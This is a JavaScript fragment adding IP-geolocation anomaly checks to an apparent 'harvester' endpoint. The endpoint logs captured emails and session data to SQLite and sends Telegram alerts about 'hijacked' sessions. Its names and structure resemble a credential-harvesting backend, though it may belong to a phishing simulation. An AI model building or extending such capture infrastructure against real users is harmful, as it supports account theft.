// Anomaly Detection Logic for harvester_post_handler.js
// Threshold for Anomaly Detection (distance from LA)
const isAnomalous = (capturedIpGeo) => {
    // Logic to check if IP is significantly outside LA/California
    return capturedIpGeo.city !== 'Los Angeles' && capturedIpGeo.region !== 'CA';
};

// Example integration in /api/v1/capture handler:
// (Assume you have a geo lookup function for IPs)
const geoLookup = require('./geo_lookup'); // You must implement or use a service

app.post('/api/v1/capture', async (req, res) => {
    // ...existing sessionInfo logic...
    const geo = await geoLookup(sessionInfo.remoteAddress);
    if (isAnomalous(geo)) {
        // 1. Mark as "High Risk" in SQLite
        db.prepare("UPDATE telemetry SET risk_score = 95 WHERE email = ? AND timestamp = ?")
          .run(sessionInfo.username, sessionInfo.createTime);
        // 2. Trigger an immediate 'Identity Hijack' arc (Yellow/Red Pulse)
        await sendTelegramAlert(`🚨 ANOMALY: Session hijacked from ${geo.city}!`);
    }
    // ...rest of handler...
});
